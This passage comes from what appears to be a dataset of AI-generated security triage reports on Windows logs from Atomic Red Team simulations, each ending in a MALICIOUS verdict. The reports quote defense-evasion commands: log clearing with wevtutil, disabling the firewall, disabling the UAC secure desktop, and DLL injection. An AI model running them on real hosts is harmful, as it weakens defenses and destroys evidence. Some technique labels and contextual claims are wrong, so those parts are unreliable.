2. **Audit User Accounts**: Investigate the legitimacy of the ""admin_test"" user account and reset or disable it if found compromised.
3. **Log Review and Retention**: Enhance the monitoring and retention mechanisms for event logs. Consider sending logs to a Security Information and Event Management (SIEM) system for better analysis and alerting.
4. **Regulatory Measures**: Review and enforce tighter access controls and monitoring for PowerShell and other administrative utilities.
5. **Forensic Analysis**: Conduct a deeper forensic analysis to search for any additional Indicators of Compromise (IoCs) and ensure any payloads or backdoors are identified and removed."
Modify Registry of Current User Profile - cmd,"Upon reviewing the provided Windows event logs, a number of points merit consideration:

1. **Event Clearing**: The logs indicate that multiple event logs (Sysmon, Security, Application, System, and Windows PowerShell) were cleared by the user `admin_test`. The combination of events, Event ID 104 in the System log and Event ID 1102 in the Security log, strongly suggests that someone attempted to tamper with the logs to cover their tracks. The execution of `wevtutil.exe` with the `cl` (clear log) command for multiple logs at the same time is suspicious because this command is typically used to maintain system operation clarity rather than obscure actions.

2. **Registry Modification**: There is an execution of `cmd.exe` with a command to modify the registry to hide file extensions (`reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f`). Hiding file extensions can be a tactic used to disguise files with malicious intent, as the true file type may be obscured.

3. **High Privilege Execution**: Various processes, including `whoami.exe`, `hostname.exe`, and the registry modification, are executed under a high integrity level, indicating administrative privileges were used. This points towards an insider threat or unauthorized privilege escalation.

4. **Time Synchronization Activity**: There are routine events related to time synchronization using `time.windows.com`, which, by itself, is generally benign. However, if viewed in conjunction with log tampering, it could suggest efforts to alter or synchronize times to cover the tracks of malicious activity.

5. **Suspicious Pattern of Process Execution**: The sequence of executed processes (`wevtutil.exe`, `cmd.exe`, `reg.exe`, `hostname.exe`, `whoami.exe`) suggests potential scripted or automated activity. Typically, `whoami` and `hostname` might be used to gather system information, frequently as a prelude to further unauthorized action.

Based on the above indicators, the presence of log file clearing attempts, registry modifications to hide file extensions, and high privilege process execution leads to a conclusion of potential malicious activity or compromise. The use of administrative credentials to perform these operations significantly increases the level of concern.

**Assessment**: MALICIOUS

**Guidance**:
- Immediately investigate and verify the identity and actions of `admin_test`.
- Perform a thorough forensic analysis to understand if other systems or data were compromised.
- Check for additional indicators of compromise or lateral movement on the network.
- Ensure the environment is monitored for further suspicious activity.
- Consider reviewing and possibly enhancing access control policies, especially for admin accounts.
- Conduct an organization-wide audit of current security policies and training sessions on cybersecurity best practices for all employees."
Renamed Microsoft.Workflow.Compiler.exe Payload Executions,"The logs provided demonstrate a combination of events suggesting both potentially anomalous and clearly suspicious or malicious activities. Here is a detailed analysis:

1. **Log Clearing Events (Security and System Logs)**:
    - Event ID 1102 from the Security Log and Event ID 104 from the System Log both indicate that logs were cleared. The logs specify a user account ""admin_test"" with a high integrity level performing log clearing using `wevtutil.exe`, the Eventing Command Line Utility.
    - The process of clearing logs is often used by attackers to cover their tracks since it prevents further forensic analysis on the activities performed before the clearing.

2. **Suspicious PowerShell Activity**:
    - The PowerShell logs indicate the execution of a suspicious command that involves launching `svchost.exe` from a temporary directory associated with Atomic Red Team payloads. The Tool Atomic Red Team is known for red-teaming and adversary simulations.
    - PowerShell, when used to execute non-standard scripts or from unusual directories, is often flagged as suspicious due to its versatility as a tool for script-based attacks.

3. **Indicators of Compromise in Sysmon Logs**:
    - Multiple `wevtutil.exe` commands were executed to clear not only the Security Log but other significant event logs.
    - A process `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\ExternalPayloads\\svchost.exe`, with an original file name `Microsoft.Workflow.Compiler.exe`, incurred a `DirectoryNotFoundException` which is abnormal for a legitimate svchost process. This suggests a potential misuse or imposter executable.
    - Several Sysmon logs highlight the execution of processes with elevated privileges (e.g., SYSTEM user executing `svchost.exe` and other binary processes).
    - This out-of-place `svchost.exe` in a temporary directory also triggered multiple errors captured in the Application Log, which matches the pattern of a malicious actor attempting to execute unauthorized or malformed processes.

4. **Unauthorized Access Attempts**:
    - Event ID 5379 in the Security logs involving `admin_test` demonstrates multiple credential operations, which resulted in a failure return code. This may represent enumeration or attempted unauthorized access or escalation by the user.

**Assessment**:
- The combination of cleared log files, the execution of potentially harmful PowerShell commands, the presence of anomalous `.exe` files in temporary directories, and failed credential operations indicates a high likelihood of malicious activity.

**Resolution**:
- **MALICIOUS**: The activities logged exhibit clear indicators of compromise including log tampering, the use of potentially malicious scripts, and anomalous process executions that strongly indicate unauthorized and potentially harmful activity.

**Guidance on How to Proceed**:
- Immediately isolate the affected machine to prevent further potential data loss or network compromise.
- Conduct a full forensic analysis of the host to identify the root cause of the breach and any other compromised systems.
- Ensure all credentials used on the affected machine are rotated, and multifactor authentication is enforced.
- Review and modify security policies to minimize the risk of future occurrences, including strict monitoring of PowerShell activity and log-ins with elevated privileges.
- Consider involving incident response professionals to investigate further and advise on remediation steps."
Masquerading - non-windows exe running as windows exe,"Based on the analysis of the provided Windows event logs, let's break down the activities observed across different logs and evaluate them for any signs of potentially malicious behavior:

### Windows PowerShell Log Analysis:

1. **PowerShell Command Execution:** 
   - The logs indicate the execution of a PowerShell command that appears to copy an executable from `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1036.003\bin\T1036.003.exe` to the temp directory as `svchost.exe`, execute it, capture its process ID, and then terminate it.
   - **Suspicious Activity:** This behavior mimics a known attack scenario (Process Injection) used in Red Team exercises, specifically from ""Atomic Red Team"" tests. While this can be legitimate if performed by authorized security personnel, the activity indicates potentially suspicious behavior due to the use of a typically benign process name (`svchost.exe`) to mask the operation.

### Security Log Analysis:

1. **Event ID 1102 (Log Cleared):**
   - A security log clearing event was performed by a user `admin_test`. This is a highly suspicious action as attackers often clear logs to cover their tracks.

2. **Multiple Event ID 5379 (Credential Validation/Read Attempt Failures):**
   - Numerous failed credential read attempts with the return code `3221226021` suggest there may have been an attempt to access or use account information without success.

### System Log Analysis:

1. **Event ID 104 (Log Cleared) in System and PowerShell Channels:**
   - Clearing of both System and Windows PowerShell logs by `admin_test` suggests attempts to evade detection by removing traces of activity. This supports the suspicion of log clearing seen in the Security log.

### Sysmon Log Analysis:

1. **Unusual PowerShell Process Activity:**
   - The execution of a PowerShell command related to `AtomicRedTeam` activities, as seen in process creation logs with specific command-line arguments, reiterates the suspicious PowerShell activity noted earlier.

2. **Usage of Wevtutil for Log Clearing:** 
   - Observed multiple executions of `wevtutil.exe` with commands clearing various logs, further suggesting attempts to hide activities.

### Conclusion and Resolution:

Upon analyzing the log entries, the activities clearly indicate an attempt at stealth through PowerShell execution that mimics known attack patterns, unauthorized log clearing operations, and multiple failed credential attempts. There are strong indicators suggesting a possible compromise or at the very least unauthorized testing or red team activities without appropriate notification to the monitoring team. 

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Isolation:** Isolate the affected host (Server002) from the network to prevent further potential malicious activity.
2. **Forensic Analysis:** Conduct a thorough forensic analysis to investigate the extent of the potential compromise and to identify any dropped or further executed payload.
3. **Audit User Activity:** Review and audit the `admin_test` account for any unauthorized changes or overlooked red team activities lacking proper authorization or notification.
4. **Policy Review:** Ensure that any security testing activities (e.g., from Atomic Red Team) are formally coordinated and documented with relevant stakeholders, security teams included.
5. **Improve Monitoring:** Enhance monitoring capabilities to include real-time alerts for suspicious behavior such as unauthorized log clearing, PowerShell activity without proper flags, and failed credential attempts.
6. **User Education:** Ensure user accounts, especially those with admin privileges, are well-educated on secure and best practices, as well as potential indicators of compromise.

This phase should be followed by a more comprehensive security assessment across the corporate network to identify and mitigate any other risks."
Modify UseTPM Registry entry,"**Detailed Analysis of the Windows Event Logs:**

The logs reveal several actions that indicate potential malicious activity on the host machine Server002. Key observations from the logs are as follows:

1. **Log Clearing Activity:**
   - Multiple event logs show the usage of the `wevtutil.exe cl` command to clear various event logs, including System, Security, and Windows PowerShell logs. This activity was performed under the user `admin_test`.
   - Clearing event logs is a common tactic used by attackers to cover their tracks after unauthorized activities. Specifically, Event ID 1102 in the Security log indicates the security logs were cleared, which is particularly concerning.

2. **Suspicious Registry Modification:**
   - The Sysmon logs show a command executed through `cmd.exe` that modifies the registry key `HKLM\SOFTWARE\Policies\Microsoft\FVE` with the value `UseTPM /t REG_DWORD /d 2 /f`. This change in registry behavior can be linked to BitLocker settings, potentially disabling TPM or altering encryption behavior without legitimate cause.

3. **Frequent Usage of Command Line Utilities:**
   - The extensive use of utilities like `hostname.exe` and `whoami.exe` in the logs suggests enumeration attempts which could be part of an attack's reconnaissance phase. These tools are typically used to gather system information that can assist an attacker in understanding the environment.

4. **Execution under High Integrity Level:**
   - The integrity level of the processes, such as `cmd.exe`, `reg.exe`, and `wevtutil.exe`, is set to ""High,"" which indicates privilege escalation may have occurred, allowing these commands to be executed with elevated permissions.

5. **EdgeUpdate Activity:**
   - There are multiple entries related to `MicrosoftEdgeUpdate.exe` processes. Although common on systems with Microsoft Edge installed, the timing and amount of updates could suggest something suspicious if they align with attack timelines. However, in absence of direct malicious evidence tied to the specific timing on these logs, it remains a secondary point of interest.

**Threat and Risk Assessment:**
- The series of actions involving event log clearance, registry changes, and system enumeration are consistent with indicators of a possible compromise scenario.
- These events, especially log clearing, are often associated with efforts to hide illicit activity, indicating a potential insider threat or an external adversary masquerading as an insider using escalated privileges.
 
**Guidance on How to Proceed:**
- Immediate steps should include performing a full security audit and forensic analysis of the system to determine the extent of the breach.
- Analyze other systems within the network for similar patterns or indicators of compromise.
- Restrict or audit the usage of high privilege accounts, particularly `admin_test`, to prevent further unauthorized access.
- Implement additional logging and monitoring to detect similar activities in the future.
- Consider resetting relevant credentials and conducting a review of group policies related to system auditing and BitLocker.

**Resolution:**
- **MALICIOUS**: The logs contain multiple signs of potentially malicious activities, including log tampering, registry modifications, and privilege escalation, indicating a likely compromise."
Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,"## Detailed Analysis

### Suspicious or Anomalous Behavior
1. **PowerShell Activity:** 
   - A PowerShell script executed a command to modify the Windows Registry:
     - `Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force`
   - This command disables the Secure Desktop for User Account Control (UAC) prompts. Altering this setting is typically associated with an attempt to reduce security settings, which can be indicative of malicious activity.

2. **Clearing of Event Logs:**
   - Multiple event logs were cleared, as observed in the Security (`EventID 1102`), System, and Windows PowerShell logs. Clearing event logs is often performed by attackers to cover their tracks after engaging in malicious activities.

3. **Sysmon Events:**
   - The use of `wevtutil.exe` to clear logs. The tool `wevtutil` (Event Log Utility) is a built-in utility to manage and clear the Windows Event Logs. Its use in conjunction with log clearing commands strongly suggests attempts to hide activity.

### Indicators of Malicious Activity
1. **Registry Modification via PowerShell:**
   - Disabling secure desktop for UAC prompts can cause serious security risks as it makes it easier for unauthorized scripts to escalate privileges without user interaction. This is a known technique used by attackers to carry out privilege escalation without user detection.

2. **Log Clearing:**
   - The action of clearing logs without legitimate reason within a short timeframe from when changes were made to system configurations using PowerShell commands signifies potential malicious intent. The logs were cleared by the same user (`admin_test`) using `wevtutil`.

### Assessment
- **Evidence of Potential Compromise:** The actions observed are highly indicative of an adversary attempting to gain persistent and stealthy access to the system by modifying security settings and erasing any trace of these modifications from the system logs.
- **Risk Assessment:** The risks associated with these activities include an ongoing unauthorized access scenario, potential privilege escalation, hiding further malicious operations, and a compromise of the target system's integrity and availability.

### Guidance on How to Proceed
1. **Immediate Remediation Steps:**
   - Re-enable UAC settings to enforce the Secure Desktop prompt.
   - Investigate the account activity of `admin_test` for unauthorized access, especially any remote logins.
   - Conduct a full sweep of the system to look for additional signs of compromise, including unauthorized software installations or configurations.
   - Review and potentially enhance the current logging and monitoring configurations to detect similar activities in the future.

2. **Forensic Actions:**
   - Preserve all current logs and conduct a timeline analysis to identify further malicious activities.
   - Assess other systems within the network for similar anomalies to ensure the issue is not widespread.

3. **Policy and Security Review:**
   - Evaluate and enforce strict admin controls and assess if user accounts are appropriately privileged.
   - Educate users and staff about suspicious email contents or downloads that could trigger such scripts.

## Resolution
The logs show strong evidence of unauthorized modifications to security settings and deliberate log tampering:

- **Resolution:** MALICIOUS

This conclusion is based on the clear indicators pointing towards malicious activity as described above. Immediate action should be taken to secure the affected systems and investigate potential network-wide impacts."
mavinject - Inject DLL into running process,"Upon analysis of the provided Windows event logs, several observations indicate potentially malicious activities, particularly around process creation and log clearing actions. Here's a breakdown of the findings:

1. **Log Clearing Events:**
   - Multiple log clearing events were observed in the Security, System, and Windows PowerShell channels. Logs were cleared by the user ""admin_test"".
   - Logs being cleared, especially in this manner, can be an indication of an attempt to cover tracks, which is a common tactic in post-compromise scenarios. Event 1102 (Security logs cleared), Event 104 (System logs cleared), and associated Sysmon events confirm these actions.

2. **Suspicious Process Executions:**
   - The `wevtutil.exe` utility is observed multiple times with the ""cl"" (clear Logs) command-line argument used to clear various logs (""System"", ""Application"", ""Security"", and ""Windows PowerShell"").
   - PowerShell was invoked potentially around the same timeframe as wevtutil operations, hinting at scripted or automated execution.
   - The presence of `cmd.exe` executing a process with a command line to inject a DLL (`mavinject.exe`) into another process. This sort of activity indicates potential execution of code in the address space of another process, which is a hallmark of malicious activity (Event ID 2092).

3. **Indicators of Compromise with Loading DLLs:**
   - Execution of `mavinject.exe` is associated with dll injection from `AtomicRedTeam` directory which usually indicates simulation of attack techniques.
   - The command-line arguments for the `mavinject.exe` execution contain paths indicative of script-based attacks or red team simulations, pointing towards malicious or suspicious activity.

4. **EdgeUpdate Activity:**
   - Although `MicrosoftEdgeUpdate.exe` and its associated processes can frequently be observed as part of normal Microsoft Edge update operations, their presence amidst other suspicious activities raises questions, particularly when juxtaposed with log clearing and DLL injection processes.

Given these observations, the activity can be assessed as **MALICIOUS** due to:
- Systematic log clearing which could indicate an attempt to hide evidence.
- Execution of `mavinject.exe` to perform DLL injection, which is commonly used in attacks to execute arbitrary code within another process.
- Overall pattern matching with tactics, techniques, and procedures (TTPs) seen in intrusion scenarios.

**Guidance and Next Steps:**
- **Immediate Containment:** Isolate the affected host (Server002) to prevent further potential data exfiltration or lateral movement within the network.
- **Forensic Analysis:** Conduct a thorough forensic investigation to determine the full extent of the compromise and any data accessed or exfiltrated.
- **Log Analysis and Monitoring Enhancement:** Implement more robust monitoring of log clearing events and suspicious process executions automation to detect and respond to similar activities in the future.
- **User Education:** Reassess user permissions and train users, especially those with administrative privileges, on security best practices to prevent credential abuse. 

Further investigation should focus on how ""admin_test"" executed these commands and securing any possible vulnerabilities exploited during this event."
Add Network Share,"### Detailed Analysis of Provided Windows Event Logs:

**Notable Events Identified:**
1. **Event Log Clearing**: 
   - **System Log (Event ID 104)** indicates that the logs for the `System`, `Windows PowerShell`, and `Security` channels were cleared by the user `admin_test`. 
   - **Security Log (Event ID 1102)** shows the clearance of Security logs.

2. **Process Executions:**
   - The logs show multiple process executions by the user `admin_test` from `C:\Users\admin_test\Documents\`, and several invocations of system utilities like `whoami.exe`, `wevtutil.exe`, `cmd.exe`, `net.exe`, and `HOSTNAME.EXE`.
   - **Sysmon Logs** showcase executions of `wevtutil.exe` with a command line indicating the clearance of logs on multiple channels including `System`, `Security`, `Microsoft-Windows-Sysmon/Operational`, and `Windows PowerShell`.

3. **Command Execution (Suspicious Commands)**
   - **Sysmon Event (Event ID 1)**: Execution of `cmd.exe` with a command line for network share operations (`net use c: \\test\share & net share test=\\test\share /REMARK:""test share"" /CACHE:No`).

4. **Time Change Events:**
   - **System and Security Logs** record a change in system time with Event ID 1 (Kernel-General) and Event ID 4616 (Security-Auditing).

**Assessment of the Situation:**
- The simultaneous clearing of multiple log channels (System, Security, and PowerShell) by a single user (`admin_test`) is highly suspicious. This action is often used by malicious actors to cover their tracks after performing unauthorized operations.
- The use of `wevtutil.exe` to clear event logs, combined with the suspicious execution of network share commands using `cmd.exe` and `net.exe`, suggests potential malicious or unauthorized configurations or data exfiltration attempts.
- The legitimate tool usage (`whoami`, `cmd`, etc.) combined with administrative actions such as log clearance and network manipulation indicates a sophisticated attempt that aligns with common attacker Tactics, Techniques, and Procedures (TTPs) for privilege escalation and defense evasion.

**Threats/Risks Identified:**
- Potential Insider Threat: Given that the involved user `admin_test` executed these suspicious operations, there might be an internal threat actor with inappropriate access privileges.
- Compromise of System Integrity: The unauthorized clearing of security event logs and potential unauthorized access to network shares might indicate a breach or preparation for a larger attack.

**Guidance on How to Proceed:**
1. **Immediate Reassessment and Revoking of Access**: Reassess and potentially revoke the administrative privileges of `admin_test`. Ensure this user's activity is heavily monitored.
2. **Thorough Incident Investigation**: Conduct a comprehensive forensic investigation to determine the extent of the breach or misuse. Retrieve backups of cleared logs if possible and analyze them for any unusual patterns that might indicate compromise.
3. **Strengthen Monitoring and Controls**: Implement enhanced monitoring on critical systems, particularly focusing on administrative actions, log clearance attempts, and unexpected network shares or connections.
4. **User Awareness and Training**: Provide further security education to users about the implications of log deletion and suspicious activity reporting.

**Resolution**: Given the evidence of potentially malicious activity indicated by log clearing and suspicious command usage, the provided logs should be classified as:

- **MALICIOUS**"
Create Windows Hidden File with Attrib,"Upon analyzing the Windows event logs provided, the following suspicious and potentially malicious activities were identified. 

### Suspicious or Anomalous Behavior:

1. **Log Clearing Actions**:
   - There are entries indicating that logs for System, Windows PowerShell, and Security channels were cleared (Event ID 104 for System and PowerShell, Event ID 1102 for Security). This action was performed by the user ""admin_test"". Frequent and unexplained log clearing is an indicator of potentially malicious activity, as attackers often clear logs to erase traces of their actions.

2. **Execution of Wevtutil**:
   - The process ""wevtutil.exe"" was executed multiple times with the command to clear different logs (`wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl System`, etc.). The `wevtutil` command is legitimate but can be used by attackers to manipulate or clear logs.
   - Each execution is tied to the ""admin_test"" user, which correlates with the log-clearing events.

3. **High Integrity Level Execution**:
   - Processes were run with high integrity levels, indicating elevated privileges. This includes command executions (`cmd.exe`) and log manipulation commands.

4. **Command and Script Execution**:
   - Several `cmd.exe` executions with obfuscated or suspicious command lines, such as checking for file existence and echoing to a file (`echo system_Attrib_T1564.001 >> %%temp%%\\T1564.001.txt`), hinting at possible attempts at defense evasion or hiding tracks.

5. **Processes Executed by Admin User**:
   - Repeated launching of processes by ""admin_test"" with suspicious command lines is a red flag, showing potentially unauthorized script execution or behavior.

6. **Presence of EdgeUpdate Execution**:
   - Microsoft Edge Update processes appear benign at first glance but should be correlated with other events or external indicators to rule out their misuse in unusual contexts.

### Assessment and Risks:

- The sequence of events—log clearing, high-integrity process execution, and script-like command lines by a potentially unauthorized admin user—suggests possible malicious behavior.
- The use of database logs `Sysmon` to track these activities shows the precision with which the actions were masked, underscoring the need for a deeper forensic investigation.
  
### Guidance and Resolution:

- **Resolution: MALICIOUS** – The activities observed, particularly the methodical clearing of multiple event logs using system utilities, are a common hallmark of malicious behavior aimed at covering tracks post-compromise.
  
### Next Steps:

1. **Immediate Investigation**:
   - Conduct a full review of the machine for further compromise evidence—root out hidden or persistent malicious software.
   - Inspect network logs for connections that could lead to an external command-and-control server.

2. **Incident Response**:
   - Isolate the affected host to prevent further propagation.
   - Conduct a thorough forensic analysis to understand the scope and impact of the breach.

3. **User and Privilege Audit**:
   - Review user privileges, especially for ""admin_test"", and assess the need for administrative-level access.
   - Consider using multi-factor authentication or a more stringent access control mechanism.

4. **Log Monitoring and SIEM Configuration**:
   - Strengthen monitoring for suspicious activities, focusing on abnormal log clearing and process executions.
   - Implement alerting for activities involving known malicious patterns or tools (e.g., wevtutil).

5. **User Education**:
   - Enhance security awareness among users regarding phishing and safe use of administrative privileges.
  
These steps should hopefully allow for the remediation of the current incident and bolster defenses against future attempts."
Blackbit - Disable Windows Firewall using netsh firewall,"Upon reviewing the provided Windows event logs, the following suspicious and potentially malicious activities have been identified:

### Anomalies and Suspicious Activities:

1. **Clearing of Event Logs:**
   - The system logs indicate multiple 'Log Cleared' operations (Event ID 104 and 1102) performed by the user `admin_test` on `Server002`. This involved clearing the System, Windows PowerShell, and Security logs within a very short period. It was done through the process `wevtutil.exe`, which is a Windows utility used for event log management.
   - Log clearing is often a sign of malicious activity, as it might indicate an attempt to cover tracks after compromising a system.

2. **Execution of 'wevtutil.exe':**
   - The Sysmon logs show several instances where `wevtutil.exe` was executed with the command-line argument to clear different logs (System, Application, Security, etc.). Clearing logs in quick succession is highly unusual and generally considered malicious if no legitimate administrative action is known.

3. **Privilege Escalation and Potential Backdoor Activity:**
   - The Security logs show a logon event (Event ID 4624) with an Elevated Token, giving the SYSTEM account extensive privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, among others). It's unclear from the logs if this is directly linked to malicious activity, but given the context, it raises suspicion.

4. **Disabling of Firewall:**
   - There is a specific log entry for `cmd.exe` and `netsh.exe` showing the execution of a command to disable the firewall: `""cmd.exe"" /c netsh firewall set opmode mode=disable`. Disabling the firewall without legitimate reasons can expose the system to broader network-based attacks and is a sign of compromise.

5. **Execution of Enumeration Commands:**
   - The execution of `whoami.exe` and `hostname.exe` indicate potential enumeration activities. Although these commands by themselves are not harmful, they are often employed by attackers post-exploitation to gather information about the compromised system.

### Assessment of the Situation:

Considering the combined activities of log clearing, privileged access with specific user privileges, firewall deactivation, and the pattern of utility execution, the logs strongly suggest malicious behavior. Normally, these activities occurring together would be indicative of an attacker attempting to cover their tracks, escalate privileges, and potentially maintain future access to the system.

### Resolution:

**MALICIOUS**

### Recommended Actions:

1. **Immediate Isolation:**
   - Isolate the affected system (Server002) from the network to prevent further spread or potential exfiltration of data.

2. **Full Investigation:**
   - Perform a thorough forensic analysis on the isolated system. Review all changes made and determine the entry point of compromise.

3. **Review and Strengthen Security Policies:**
   - Evaluate current security policies and audit logs more frequently. Use centralized log monitoring to detect similar activities in real-time.

4. **Restore Affected Systems:**
   - Depending on the level of compromise, it might be necessary to restore the system from clean backups.

5. **Monitor for Further Unusual Activity:**
   - After remediation, keep an enhanced watch on affected systems and networks for any signs of recurring incidences or settings being altered again.

6. **User Awareness and Training:**
   - Ensure users, especially privileged accounts, are trained on security best practices to reduce the risk of such compromises due to user actions."
Activate Windows NoFind Group Policy Feature,"After analyzing the provided Windows event logs, the following observations and assessments can be made:

1. **Time Manipulation:**
   - The security logs contain `EventID: 4616`, indicating a change in the system time. This kind of event can be suspicious and possibly used to manipulate the timestamps of activities to cover malicious actions. However, without additional context or abnormal patterns, it alone is not conclusive of a compromise.

2. **Log Clearance:**
   - Multiple events (e.g., `EventID: 1102` in the Security log and `EventID: 104` in the System log) indicate that logs have been cleared. This is highly suspicious and typically associated with someone trying to hide their tracks post-exploitation or during an attack.

3. **Unexpected Utility Use:**
   - There is extensive use of `wevtutil.exe`, which is a command-line tool used to manage event logs on Windows machines. It was used to clear several logs including Microsoft-Windows-Sysmon/Operational, Application, System, Security, and Windows PowerShell.

4. **Registry Changes:**
   - A `cmd.exe` process was used to change registry settings (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`), specifically adding a `NoFind` policy. This is suspicious as it might be used to restrict user capabilities, indicating potential unauthorized accesses or an attempt to maintain persistence or prepare the system for further exploitation.

5. **Process Executions Involving Administrative Accounts:**
   - Various processes such as `cmd.exe`, `whoami.exe`, and `wevtutil.exe` are running under a high integrity level, executed by the user `admin_test`. These processes are expected to be used by high privilege users; combined with the log clearance activities, this is particularly suspicious.

6. **Host Discovery Commands:**
   - Commands like `whoami.exe` and `hostname.exe` were executed. These are often used in initial phases of attacks to gather information about the target host environment.

### Assessment:
Based on the compilation of these suspicious activities, particularly the log clearance, registry modifications, and execution of commands indicative of potential reconnaissance or malicious persistence activities, this behavior strongly suggests potential malicious intent.

### Resolution:
**MALICIOUS** - The logs indicate malicious activity, particularly due to the log clearance actions and suspicious registry changes. I advise immediate containment and detailed forensic analysis to identify potential further compromises or persistence mechanisms deployed by the attacker. Furthermore, review user activity, especially for accounts with elevated privileges, and ensure system hardening and patching is up to date to mitigate any similar risks in the future."
InstallUtil HelpText method call,"Based on the provided logs, here is a detailed analysis and assessment of the situation:

### Key Observations:

1. **Log Cleared Events:**
   - The Security, System, and Windows PowerShell logs were cleared by the user `admin_test`. The clearing of logs is often a red flag indicating potential malicious activity aimed at covering tracks.

2. **PowerShell Events:**
   - Several PowerShell scripts appear to be executed, including a script from the Atomic Red Team project, which is often used for security testing and adversary simulation.
   - The PowerShell script `InstallUtilTestHarness.ps1` is executed with commands involving `InstallUtil.exe` and includes functionalities to write to temporary files, which is consistent with known tactics, techniques, and procedures (TTPs) of adversaries.
   - Specific reference to T1218.004 in the PowerShell logs suggests a direct mapping to the MITRE ATT&CK technique for ""Hijack Execution Flow: .dll"" via the .NET utilities, which can be used for defense evasion.

3. **Suspicious Process Executions:**
   - The usage of `wevtutil.exe` command line to clear logs (`""cl""`) for different channels, Security, System, and Application logs.
   - The execution of tools such as `whoami` and `hostname` suggests enumeration actions typical of reconnaissance conducted by threat actors.

4. **Sysmon Events:**
   - Several process creations for `PowerShell.exe`, `wevtutil.exe`, `InstallUtil.exe`, and other processes indicate unusual usage patterns.
   - The presence of `InstallUtil.exe` is noted, which is a legitimate tool but its usage in this context with PowerShell and .dll files is suspicious.

### Assessment:

Based on the combination of cleared logs, the execution of testing/enumeration scripts, and the use of legitimate tools (like InstallUtil.exe) potentially being abused (T1218.004), the activities observed within the logs strongly indicate malicious intent. This is especially concerning given the actions were performed on the CEO's machine, which could be a target due to its high-value nature.

### Guidance:

- **Immediate Containment:** The host `Server002` should be isolated from the network to prevent further spread of potential malicious activities.
- **Forensic Analysis:** Conduct a comprehensive forensic analysis of `Server002` to recover any deleted logs and gain deeper insights into the scope and impact of the compromise.
- **Review and Harden Policies:** Implement stricter policies for log retention and monitor the use of sensitive tools like PowerShell and `InstallUtil.exe`.
- **Threat Hunting:** Extend threat hunting activities to identify potential lateral movement or additional compromised systems within the network.

### Conclusion:

**Resolution: MALICIOUS**

The logs indicate clear signs of malicious activity aimed at evading detection and performing unauthorized actions on the system. Immediate and decisive action is necessary to secure the environment."
AMSI Bypass - Override AMSI via COM,"After analyzing the provided Windows event logs, I have identified several events that may indicate suspicious or potentially malicious activity:

1. **Event Log Clearing**: There are recorded log entries that indicate log files (System, Security, and Windows PowerShell) were cleared by the user ""admin_test"". This activity is represented by the events with EventIDs 104 and 1102 in the System and Security logs, respectively. Clearing of event logs can be a sign of malicious intent to remove traces of other activities.

2. **Registry Modification**: There is an event involving `cmd.exe` executing a command to add a registry key under HKCU\\Software\\Classes\\CLSID with an `InProcServer32` entry pointing to a non-existent DLL (`C:\\IDontExist.dll`). This operation is captured in EventID 1 for `cmd.exe` and `reg.exe` in the Sysmon logs. The modification of registry entries, especially under the CLSID path, can be used for persistence or other malicious purposes.

3. **Multiple Uses of `wevtutil.exe`**: There are several instances where `wevtutil.exe` is run, presumably to clear different event logs, as shown in events logging this utility's operations across multiple entries (Sysmon EventID 1). When used in succession with log clearing events, it warrants concern as `wevtutil.exe` is commonly used to manipulate event logs.

4. **TimeChange Events**: There are repeated Security log entries indicating changes in system time (EventID 4616). While adjusting the time could be benign, doing so repeatedly within such a short timeframe can be suspicious as it may be an attempt to confuse timestamps in log files.

5. **EDA (Edge Update) Activity**: There are logs from Microsoft Edge Update processes installing and updating, which is expected behavior for system maintenance. However, each process’ activity should be verified against the expected update schedule to rule out exploitation via this update mechanism.

### Assessment and Resolution:

Given the combination of the logs being purposely cleared, suspicious registry modification, the use of `wevtutil.exe` (commonly used in malware execution post-exploitation), and unexplained system time changes, this scenario is concerning. The activities are indicative of potential efforts to maintain persistence and cover tracks.

**Resolution**: **MALICIOUS**

### Guidance:

1. **Immediate Data Preservation**: Ensure that current event logs are preserved to prevent further loss of historical context.

2. **Network Isolation**: Isolate the affected system from the network to prevent potential lateral movement or data exfiltration.

3. **Run a Comprehensive Threat Detection**: Execute a deep scan using an EDR solution to search for any traces of malicious activity that may not be evident in logs alone.

4. **Incident Response Engagement**: Engage with incident response teams to perform a thorough investigation and confirm the presence of any unauthorized access or malware.

5. **Audit User Activity**: Audit user activities account ""admin_test"" and others with admin privileges for any unauthorized access or anomalies.

6. **Review System Integrity**: Scan the system for rootkits or other persistence mechanisms not readily visible.

7. **Assess Registry Changes**: Examine all recent registry changes for unauthorized modifications potentially indicating persistence mechanisms."
Compile After Delivery using csc.exe,"## Detailed Analysis of the Windows Event Logs

### Overview of Events
Upon review of the provided Windows event logs, multiple activities from different log channels (System, Security, Sysmon, etc.) were examined for indicators of potential malicious activity. The logs present a series of events that raise several red flags, particularly around log file clearing operations and suspicious command executions.

### Suspicious and Anomalous Behaviors

1. **Log Clearing Activities:**
   - Events with ID 104 (System log), 1102 (Security log) indicate that log files for the System, Windows PowerShell, and Security channels have been cleared by the user ""admin_test"". Typically, legitimate operations do not require periodic clearing of logs, especially without a corresponding reason, which could suggest an attempt to cover tracks after malicious activities.

2. **Unusual Process Execution:**
   - Wevtutil.exe, a process normally used for managing event logs, was executed several times to clear logs (Sysmon events):
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl \""Windows PowerShell\""""`
   - These commands suggest deliberate efforts to delete logs and hide potential malicious activities.

3. **NTLM Logon:**
   - Logons via NTLM from external IP (`192.168.0.102`), combined with high privilege access events (Event ID 4672), suggest the account ""admin_test"" may have been compromised and used for executing elevated actions.

4. **Compilation of Code In `Temp` Directory:**
   - The execution of `cmd.exe` to compile a C# script (`calc.cs`) located in the `Temp` directory (Sysmon events) using `csc.exe` is unusual:
